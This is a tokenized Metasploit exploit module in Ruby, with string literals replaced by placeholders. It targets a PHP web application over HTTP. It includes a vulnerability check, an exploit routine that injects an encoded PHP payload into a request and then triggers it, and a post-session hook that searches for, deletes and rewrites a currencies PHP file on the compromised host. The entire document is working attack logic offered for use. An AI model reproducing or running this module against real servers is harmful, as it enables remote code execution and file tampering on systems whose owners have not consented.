require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > false , <str> = > [ <str> ] , <str> = > ARCH_PHP , <str> = > { } , <str> = > <str> , <str> = > [ [ <str> , { } ] ] , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def check uri = target_uri . path uri << <str> if uri [ - <int> , <int> ] != <str> res = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( uri , <str> ) } ) if res and res . code == <int> and res . body =~ <str> return Exploit :: CheckCode :: Appears end res = send_request_cgi ( { <str> = > <str> , <str> = > uri + <str> } ) if res and res . code == <int> and res . body =~ <str> return Exploit :: CheckCode :: Detected end return Exploit :: CheckCode :: Safe end def on_new_session ( client ) peer = <str> client . peerhost <str> client . peerport <str> if client . type != <str> print_error ( <str> ) print_error ( <str> ) return end client . core . use ( <str> ) if not client . ext . aliases . include? ( <str> ) currencies_php = <<- <str> eof <str> <str> eof currencies_php = currencies_php . gsub ( <str> , <str> ) pwd = client . fs . dir . pwd print_status ( <str> pwd <str> ) res = client . fs . file . search ( nil , <str> , true , - <int> ) res . each do | hit | filename = <str> hit [ <str> ] <str> hit [ <str> ] <str> print_warning ( <str> filename <str> ) client . fs . file . rm ( filename ) fd = client . fs . file . new ( filename , <str> ) fd . write ( currencies_php ) fd . close end print_status ( <str> ) end def exploit uri = target_uri . path uri << <str> if uri [ - <int> , <int> ] != <str> peer = <str> rhost <str> rport <str> stub = <str> payload . encoded <str> print_status ( <str> ) response = send_request_cgi ( { <str> = > normalize_uri ( uri , <str> ) , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <str> , <str> = > stub } } ) if response and response . code != <int> print_error ( <str> response . code <str> ) return end print_status ( <str> ) timeout = <int> . <oct> response = send_request_cgi ( { <str> = > normalize_uri ( uri , <str> ) , <str> = > <str> , <str> = > { <str> = > <str> , } } , timeout ) if response and response . code != <int> print_error ( <str> response . code <str> ) end handler end end 
